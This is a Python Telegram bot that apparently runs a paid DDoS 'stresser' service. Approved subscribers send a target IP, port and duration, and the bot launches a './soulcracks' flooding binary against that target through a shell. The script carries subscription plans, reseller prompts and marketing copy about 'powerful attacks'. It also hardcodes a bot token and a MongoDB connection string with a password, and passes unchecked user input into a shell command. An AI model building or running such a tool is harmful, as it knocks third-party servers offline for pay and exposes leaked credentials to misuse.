import os
import telebot
import json
import requests
import logging
import time
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
import asyncio
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

loop = asyncio.get_event_loop()

TOKEN = '7254842021:AAEEvHd6cPB7o4HEOOkFlkXwkb5aPMIRVXM'
MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
FORWARD_CHANNEL_ID = -1002426158498
CHANNEL_ID = -1002426158498
error_channel_id = -1002426158498

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['rishi']
users_collection = db.users

bot = telebot.TeleBot(TOKEN)
REQUEST_INTERVAL = 1

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

running_processes = []


REMOTE_HOST = '4.213.71.147'  
async def run_attack_command_on_codespace(target_ip, target_port, duration):
    command = f"./soulcracks {target_ip} {target_port} {duration}"
    try:
       
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1: 
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

last_attack_time = {}

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check if the user is approved to use the /attack command
    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return


    current_time = time.time()


    if user_id in last_attack_time:
        last_attack = last_attack_time[user_id]
        time_diff = current_time - last_attack

        if time_diff < 265.78:
            wait_time = 265.78 - time_diff
            bot.send_message(chat_id, f"⏳ Please wait {wait_time:.2f} seconds before initiating another attack.", parse_mode='Markdown')
            return

    bot.send_message(chat_id, "*Please provide the details for the attack in the following format:*\n* <host> <port> <time>*", parse_mode='Markdown')
    bot.register_next_step_handler(message, process_attack_command)

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*WRONG COMMAND PLEASE /start*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        # Proceed with attack command execution
        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Wrong IP port. Please provide the correct IP port.*", parse_mode='Markdown')
            return


        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Attack Initiated! 💥\n\n🗺️ Target IP: {target_ip}\n🔌 Target Port: {target_port}\n⏳ Duration: {duration} seconds*", parse_mode='Markdown')


        last_attack_time[user_id] = time.time()

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def send_not_approved_message(chat_id):
    bot.send_message(
        chat_id, 
        "*🚫 Unauthorized Access! 🚫*\n\n"
        "*Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:*\n\n"
        "👉 *Contact an Admin or the Owner for approval.*\n"
        "🌟 *Become a proud supporter and purchase approval.*\n"
        "💬 *Chat with an admin now and level up your capabilities!*\n\n"
        "🚀 *Ready to supercharge your experience? Take action and get ready for powerful attacks!*", 
        parse_mode='Markdown'
    )



def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*WRONG COMMAND PLEASE /start*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, "*Wrong IP port. Please provide the correct IP port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)


        bot.send_message(message.chat.id, f"*🚀 Attack Initiated! 💥\n\n🗺️ Target IP: {target_ip}\n🔌 Target Port: {target_port}\n⏳ Duration: {duration} seconds*", parse_mode='Markdown')

        bot.send_message(message.chat.id, "ATTACK SEND SUCCESSFULY! 💥🚀")

    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):

    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)

  
    # Create buttons
    btn1 = KeyboardButton("")
    btn2 = KeyboardButton("🚀Attack")
    btn3 = KeyboardButton("")
    btn4 = KeyboardButton("ℹ️ My Info")
    btn5 = KeyboardButton("")
    btn6 = KeyboardButton("")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)

    bot.send_message(message.chat.id, "*🚀BOT READY TO ATTACK🚀*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        bot.reply_to(message, "*Instant Plan selected*", parse_mode='Markdown')
    elif message.text == "🚀Attack":
        bot.reply_to(message, "*🚀Attack Selected*", parse_mode='Markdown')
        attack_command(message)
    elif message.text == "💼ResellerShip":
        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-*", parse_mode='Markdown')
    elif message.text == "ℹ️ My Info":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})


        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'Not Approved')
            valid_until = user_data.get('valid_until', 'Not Approved')
            

            role = 'User' if plan > 0 else 'Not Approved'


            response = (
                f"*👤User Info*\n"
                f"🔖 Role: {role}\n"
                f"🆔 User ID: {user_id}\n"
                f"👤 Username: @{username}\n"
                f"⏳ Approval Expiry: {valid_until if valid_until != 'Not Approved' else 'Not Approved'}"
            )
        else:
            response = "*No account information found. Please contact the administrator.*"
        
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "🤖STRESSER SERVER":
        bot.reply_to(message, "*🤖STRESSER SERVER RUNNING....*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*Contact admin selected*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*Invalid option*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("SOUL SERVER RUNNING.....")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
